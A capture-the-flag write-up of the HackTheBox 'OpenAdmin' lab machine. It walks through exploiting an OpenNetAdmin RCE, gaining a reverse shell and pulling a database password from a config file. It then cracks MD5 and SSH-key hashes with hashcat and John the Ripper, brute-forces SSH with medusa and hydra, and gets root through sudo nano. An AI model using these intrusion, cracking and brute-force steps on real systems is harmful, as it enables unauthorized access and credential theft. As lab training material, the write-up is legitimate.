---
title: HackTheBox - OpenAdmin
date: 2021-01-01 23:21:04 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy,OpenNetAdmin, RCE, reverse-shell, linpeas, plain text password, MySQL, password cracking, hashcat, brute-force, medusa, hydra, ssh port forwarding, ssh2john, John The Ripper, sudo misconfiguration, GTFOBins, nano, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/OpenAdmin.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN OpenAdmin-full-port-scan.txt 10.10.10.171
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Apache/2.4.29

![apache](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/80-apache.png)

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/80-dirb.png)

#### `/artwork`

![artwork](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/80-artwork.png)

#### `/music`

![music](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/80-music.png)

The **Login button** at the top right of the page redirects to [http://10.10.10.171/ona/](http://10.10.10.171/ona/)

#### `/ona`

![ona](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/80-ona.png)

This version of OpenNetAdmin seems vulnerable to a **RCE** (Remote Code Execution).

![searchsploit](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/searchsploit.png)

## Reverse shell (www-data)

I used this [exploit](https://github.com/amriunix/ona-rce) and I got a shell:

![ona RCE](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/ona-rce.png)

First I thought we are in a restricted shell. Then I inspect how our payload was sent.

![payload](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/payload.png)

So I figured out that **we didn't really have a shell**.

**The python script was just sending bash commands one after the other though HTTP requests**.

Thereby, I redirected the shell to my machine:

![reverse-shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/reverse-shell.png)

We identified two users:

- `jimmy`
- `joanna`

![permission-denied](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/permission-denied.png)

Both of these users are part of the `internal`'s group.

![internal group](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/internal.png)

Moreover, **linpeas.sh** showed us something that might lead us to privesc into root:

![linpeas](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/linpeas-1.png)

So we have to find a way to access to joanna's account.

I started my enumeration by looking for files/directories owned either by **joanna** or **jimmy** or the **internal** group.  

```bash
$ find / -user joanna 2>/dev/null
/home/joanna
$ find / -user jimmy 2>/dev/null
/var/www/internal
/home/jimmy
$ find / -group internal 2>/dev/null
/var/www/internal
$ ls -la /var/www/internal
ls: cannot open directory '/var/www/internal': Permission denied
```

### MySQL

Looking at active ports via `netstat -tulpn`, it seems there is mysql running on port 3306:

![active ports](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/active-ports.png)

Indeed:

![mysql](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/mysql.png)

I decided to return to `/opt/ona/www/` and look for some credentials.

```bash
$ grep -ri "passw" *
# ...
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
# ...
```

![database_settings](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/database_settings.png)

`MySQL` credentials found:

- **username**: `ona_sys`
- **password**: `n1nj4W4rri0R!`

> `mysql -u ona_sys --password`

![mysql-logged-in](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/mysql-logged-in.png)

```sql
mysql> show databases;
+--------------------+ 
| Database           | 
+--------------------+ 
| information_schema | 
| ona_default        | 
+--------------------+ 
2 rows in set (0.00 sec)

mysql> use ona_default;

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> SELECT * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2021-01-01 19:35:54 | 2021-01-01 19:35:54 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```

A hash of 32 characters is probably a MD5 hash:

![32chars-hash](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/32chars-hash.png)

### Cracking passwords with `hashcat`

```bash
$ echo "098f6bcd4621d373cade4e832627b4f6" > hashes
$ echo "21232f297a57a5a743894a0e4a801fc3" >> hashes
$ hashcat hashes -m 0 /usr/share/wordlists/rockyou.txt
#...
```

> `-m 0` tells hashcat which mode to use. 0 is MD5.

![hashcat](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/hashcat.png)

These credentials are for [http://10.10.10.171/ona/](http://10.10.10.171/ona/)

## User (jimmy) 

The password we found in `/opt/ona/www/local/config/database_settings.inc.php` (`n1nj4W4rri0R!`) worked to log in as jimmy with SSH.

### Bruteforcing SSH

#### `medusa`

```bash
$ cat users.txt 
jimmy
joanna
$ cat pass.txt 
n1nj4W4rri0R!
test
admin
$ medusa -h $TARGET -U users.txt -P pass.txt -M ssh 
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: jimmy (1 of 2, 0 complete) Password: n1nj4W4rri0R! (1 of 3 complete)
ACCOUNT FOUND: [ssh] Host: 10.10.10.171 User: jimmy Password: n1nj4W4rri0R! [SUCCESS]
ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: joanna (2 of 2, 1 complete) Password: n1nj4W4rri0R! (1 of 3 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: joanna (2 of 2, 1 complete) Password: test (2 of 3 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: joanna (2 of 2, 1 complete) Password: admin (3 of 3 complete)
```

#### `hydra` 

We could done that with `hydra` too:

> `hydra -L users.txt -P pass.txt $TARGET ssh`

![hydra](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/hydra.png)

![ssh jimmy](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/ssh-jimmy.png)

### `/var/www/internal`

Let's go back to `/var/www/internal` _(the folder that we did not have access to before)_:

![internnal sources](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/internal-src.png)

- `index.php`:

```php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

        .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```

- `main.php`:

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

These files are probably the ones that are running on port **52846** as we identified via `netstat -tulpn` and with `linpeas.sh`.

Indeed, if we curl [http://127.0.0.1:52846](http://127.0.0.1:52846):

![curl](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/curl.png)

#### SSH port forwarding

At this point, we could use SSH port forwarding:

```bash
$ ssh -L 52846:localhost:52846 jimmy@$TARGET
```

It worked:

![ssh-port-forwarding](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/ssh-port-forwarding.png)

We can try determine what is the password that corresponds to the SHA512 hash `00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1`, or we can directly edit the sources since we have write privileges on `/var/www/internal`:

![edited sources](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/edited.png)

Voilà:

![rsa](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/rsa.png)

## User (joanna)

Joanna's private key is encrypted:

![encrypted rsa key](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/enc.png)

While we don't know the password of this private key we cannot log in as joanna.

### ssh2john

```bash
$ /usr/share/john/ssh2john.py joanna_rsa > joanna_rsa.john
$ john joanna_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_rsa)
1g 0:00:00:01 DONE (2021-01-01 22:27) 0.5586g/s 8012Kp/s 8012Kc/s 8012KC/s  0125457423 ..*7¡Vamos!
Session completed
```

`bloodninjas` is `joanna_rsa`'s password. We can now log in as **joanna**.

![ssh joanna](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/bloodninjas.png)

- **joanna**'s flag:

```bash
joanna@openadmin:~$ cat user.txt 
c9b2cf07d40807e62af62660f0c81b5f
```

## Root

Now this is pretty straightforward since we saw earlier that `joanna` can run `nano` with `sudo` _(thanks to linpeas)_.

![sudo -l](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/sudo-l.png)

We just have to check [GTFOBins - nano](https://gtfobins.github.io/gtfobins/nano/) to find a way to privesc.

![GTFOBins - sudo nano](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/gtfo-nano.png)

And we got **root**'s flag (`2f907ed450b361b2c2bf4e8795d5b561`):

![root flag](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/openadmin/root-flag.png)
___

## Useful links

- [ona-rce](https://github.com/amriunix/ona-rce)
- [MySQl commands](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
- [Hashes length](https://www.mobilefish.com/services/hash_generator/hash_generator.php)
- [Upgrading to a fully interactive reverse shell](https://www.boiteaklou.fr/Fully-interactive-reverse-shell.html)
- [SSH Port Forwarding Example](https://www.ssh.com/ssh/tunneling/example)
- [GTFOBins - nano](https://gtfobins.github.io/gtfobins/nano/)